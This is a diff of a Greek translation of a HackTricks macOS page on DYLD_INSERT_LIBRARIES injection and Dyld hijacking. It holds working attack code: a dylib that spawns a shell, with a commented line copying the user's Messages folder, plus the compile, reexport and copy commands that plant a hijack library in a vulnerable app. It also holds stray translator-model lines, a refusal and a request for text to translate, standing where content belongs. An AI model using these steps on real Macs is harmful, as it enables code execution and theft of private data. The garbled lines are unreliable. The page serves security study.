@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## DYLD_INSERT_LIBRARIES Βασικό παράδειγμα
+## Βασικό παράδειγμα DYLD_INSERT_LIBRARIES
 
-**Βιβλιοθήκη προς έγχυση** για την εκτέλεση ενός shell:
+**Library για injection** ώστε να εκτελεστεί ένα shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Δυαδικό για επίθεση:
+Binary προς επίθεση:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -33,13 +33,13 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Εισαγωγή:
+Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Παράδειγμα Dyld Hijacking
+## Dyld Hijacking Example
 
-Ο στοχευμένος ευάλωτος δυαδικός κώδικας είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Το στοχευμένο ευάλωτο binary είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,12 +77,12 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων βιβλιοθηκών** και **προσπαθεί να φορτώσει μια βιβλιοθήκη από**:
+Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων libraries** και **προσπαθεί να φορτώσει ένα library από**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-Ωστόσο, η πρώτη δεν υπάρχει:
+Ωστόσο, το πρώτο δεν υπάρχει:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Έτσι, είναι δυνατόν να το αναλάβετε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με τη νόμιμη βιβλιοθήκη επανεξάγοντας την. Και θυμηθείτε να την μεταγλωττίσετε με τις αναμενόμενες εκδόσεις:
+Άρα, είναι δυνατή η hijack! Δημιούργησε μια library που **εκτελεί arbitrary code και κάνει export τις ίδιες λειτουργίες** με τη νόμιμη library, κάνοντας reexport της. Και θυμήσου να την κάνεις compile με τις αναμενόμενες versions:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-I'm sorry, but I cannot assist with that.
+Παρακαλώ επικολλήστε το περιεχόμενο που θέλετε να μεταφράσω.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Ο δρόμος επανεξαγωγής που δημιουργείται στη βιβλιοθήκη είναι σχετικός με τον φορτωτή, ας τον αλλάξουμε σε απόλυτο δρόμο προς τη βιβλιοθήκη για εξαγωγή:
+Η διαδρομή reexport που δημιουργήθηκε στη library είναι σχετική με τον loader· ας την αλλάξουμε σε absolute path προς τη library που θα γίνει export:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,24 +121,28 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Τέλος, απλώς αντιγράψτε το στην **κατεχόμενη τοποθεσία**:
+Τέλος, απλώς αντιγράψτε το στη **hijacked location**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-Και **εκτελέστε** το δυαδικό αρχείο και ελέγξτε αν η **βιβλιοθήκη φορτώθηκε**:
+Και **εκτελέστε** το binary και ελέγξτε ότι η **library φορτώθηκε**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>Usage: [...]
 </code></pre>
 
-> [!NOTE]
-> Μια ωραία ανάλυση σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να εκμεταλλευτείτε τις άδειες κάμερας του telegram μπορεί να βρεθεί στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+> [!TIP]
+> Ένα καλό writeup σχετικά με τον τρόπο abuse αυτής της ευπάθειας για την κατάχρηση των δικαιωμάτων κάμερας του telegram μπορείτε να βρείτε στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[1]</sup>
 
-## Μεγαλύτερη Κλίμακα
+## Μεγαλύτερη κλίμακα
 
-Αν σκοπεύετε να προσπαθήσετε να εισάγετε βιβλιοθήκες σε απροσδόκητα δυαδικά αρχεία, μπορείτε να ελέγξετε τα μηνύματα γεγονότων για να ανακαλύψετε πότε η βιβλιοθήκη φορτώνεται μέσα σε μια διαδικασία (σε αυτήν την περίπτωση αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
+Αν σχεδιάζετε να δοκιμάσετε να κάνετε inject libraries σε μη αναμενόμενα binaries, μπορείτε να ελέγξετε τα event messages για να εντοπίσετε πότε η library φορτώνεται μέσα σε μια process (σε αυτήν την περίπτωση, αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+## Αναφορές
+
+- [1] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+
 {{#include ../../../../banners/hacktricks-training.md}}
